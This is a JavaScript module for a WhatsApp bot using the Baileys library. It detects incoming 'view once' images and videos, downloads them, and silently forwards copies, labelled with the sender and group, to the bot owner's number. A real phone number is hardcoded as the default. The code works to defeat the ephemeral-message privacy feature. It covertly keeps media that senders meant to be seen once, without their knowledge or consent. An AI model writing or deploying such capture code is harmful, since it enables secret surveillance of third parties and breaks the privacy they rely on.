import { downloadContentFromMessage } from "@whiskeysockets/baileys";

const antiViewOnceWorker = {
    name: "antiviewonce_worker",
    async execute(sock, msg, settings) {
        try {
            // 1. 🛡️ FILTERS
            if (!settings.antiviewonce) return;
            if (msg.key.fromMe) return;

            // 2. 🔍 DETECTION: Look for View Once (Images or Videos)
            const mtype = Object.keys(msg.message || {})[0];
            const viewOnce = msg.message?.[mtype]?.viewOnce || mtype === 'viewOnceMessage' || mtype === 'viewOnceMessageV2';
            
            if (!viewOnce) return;

            // 3. 📦 EXTRACTION
            const vMsg = mtype === 'viewOnceMessageV2' ? msg.message.viewOnceMessageV2.message : 
                         mtype === 'viewOnceMessage' ? msg.message.viewOnceMessage.message : msg.message;
            
            const mediaType = Object.keys(vMsg)[0]; // imageMessage or videoMessage
            const stream = await downloadContentFromMessage(vMsg[mediaType], mediaType.replace('Message', ''));
            
            let buffer = Buffer.from([]);
            for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }

            // 4. 📍 ORIGIN TRACKING
            const from = msg.key.remoteJid;
            const sender = msg.key.participant || from;
            const isGroup = from.endsWith('@g.us');
            const sourceLabel = isGroup ? `👥 GROUP: ${from}` : `👤 INBOX: ${sender.split('@')[0]}`;
            const caption = `┌─『 ᴠ-ʜᴜʙ_ᴀʀᴄʜɪᴠᴇ 』\n│ ✅ ᴠɪᴇᴡ_ᴏɴᴄᴇ_ᴅᴇᴛᴇᴄᴛᴇᴅ\n│ 📍 sᴏᴜʀᴄᴇ: ${sourceLabel}\n│ 👤 sᴇɴᴅᴇʀ: ${msg.pushName || 'User'}\n└────────────────────────┈`;

            // 5. 🚀 SILENT FORWARD (To your own number)
            const myNumber = (process.env.OWNER_NUMBER || "254768666068") + "@s.whatsapp.net";

            if (mediaType === 'imageMessage') {
                await sock.sendMessage(myNumber, { image: buffer, caption: caption });
            } else if (mediaType === 'videoMessage') {
                await sock.sendMessage(myNumber, { video: buffer, caption: caption });
            }

            console.log(`✅ [V-HUB ARCHIVE]: View Once saved from ${msg.pushName}`);

        } catch (e) {
            console.error("Archive Error:", e.message);
        }
    }
};

export default antiViewOnceWorker;
